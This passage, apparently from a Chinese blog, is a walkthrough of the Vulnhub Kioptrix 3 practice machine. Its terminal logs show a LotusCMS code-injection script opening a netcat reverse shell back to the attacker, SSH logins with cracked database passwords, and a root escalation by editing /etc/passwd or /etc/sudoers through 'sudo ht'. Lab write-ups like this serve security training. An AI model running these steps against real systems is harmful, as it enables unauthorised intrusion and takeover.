<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# chmod +x lotusRCE.sh</span><br><span class="line">root@kali:~# ./lotusRCE.sh 192.168.43.158</span><br><span class="line"></span><br><span class="line">Path found, now to check for vuln....</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;Hood3dRob1n</span><br><span class="line">Regex found, site is vulnerable to PHP Code Injection!</span><br><span class="line"></span><br><span class="line">About to try and inject reverse shell....</span><br><span class="line">what IP to use?</span><br><span class="line">192.168.43.177</span><br><span class="line">What PORT?</span><br><span class="line">2333</span><br><span class="line"></span><br><span class="line">OK, open your local listener and choose the method for back connect: </span><br><span class="line">1) NetCat -e	    3) NetCat Backpipe	5) Exit</span><br><span class="line">2) NetCat /dev/tcp  4) NetCat FIFO</span><br><span class="line">#? 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# nc -lvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.43.177] from kioptrix3.com [192.168.43.158] 56259</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试用之前SQL注入得到的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure></p>
<p>进行SSH连接，发现第一个账号不能没有多大的作用，不能提权。</p>
<p>连接第二个账号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span><br><span class="line">loneferret@Kioptrix3:~$ ls</span><br><span class="line">checksec.sh  CompanyPolicy.README</span><br></pre></td></tr></table></figure>
<p>存在一个<code>CompanyPolicy.README</code>文件.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checksec.sh  CompanyPolicy.README</span><br><span class="line">loneferret@Kioptrix3:~$ cat CompanyPolicy.README </span><br><span class="line">Hello new employee,</span><br><span class="line">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br><span class="line">Please use the command &apos;sudo ht&apos;.</span><br><span class="line">Failure to do so will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">CEO</span><br></pre></td></tr></table></figure>
<p>英语比较垃圾，百度翻译的意思是可以通过<code>sudo ht</code>对文件进行编辑，创建。</p>
<p>在kali下尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>
<p>报错不能打开一个<code>xterm-256color.</code>终端。</p>
<p>回到本地环境用<code>xshell</code>连接是可以打开的</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_13.png" alt=""></p>
<p>此时按<code>F3</code>，可以输入<code>/etc/passwd</code>或者<code>/etc/sudoers</code>文件来进行文件编辑</p>
<p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_14.png" alt=""></p>
<p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_15.png" alt=""></p>
<p>重新登录SSH。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Last login: Tue May  8 19:27:01 2018 from uknow-pc</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),100(users)</span><br><span class="line">root@Kioptrix3:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>此时已经是<code>root</code>权限了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验过程挺长的，发现了很多地方的问题，第一是发现了<code>phpmyadmin</code>我尝试用写日志的方法试试能不能拿到shell。但是发现<code>phpmyadmin</code>变量了不存在<code>general log</code>变量。</p>
<p>另外就是这里有个SQL注入，可以用<code>sqlmap</code>跑出来，是<code>root</code>权限。尝试用<code>os-shell</code>写shell。通过了之前用远程命令执行得到的绝对路径，但是还是无法写入。好像是目录权限的问题。</p>
<p>在<code>phpmyadmin</code>下也无法执行<code>INTO OUTFILE</code>函数。显示<code>#1 - Can&#39;t create/write to file</code>。从在命令执行里也看得出来目录是没有权限的。</p>
<p>在最后补充了一个文件包含和后台上传的利用，这个组合通过文件包含执行图片木马，得到一个shell。虽然说很鸡肋，还是感觉有点厉害的。</p>
<p>在实验过程中还是想多多尝试多种方法的，但是实验环境还是有限。但在这次实验中还是学到了很多，做了几次<code>vulnhub</code>的实验了，感觉提权方面还是有学习到很多。</p>
<p>虽然说这些环境有点不常见甚至奇葩，但是还是在这个过程中学到了<code>linux</code>环境下的一些之前一直匮乏的知识。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/uncategorized/Vulnhub渗透测试练习-Kioptrix-4.html" class="prev">PREV</a><a href="/posts/notes/Vulnhub渗透测试练习-Kioptrix-2.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>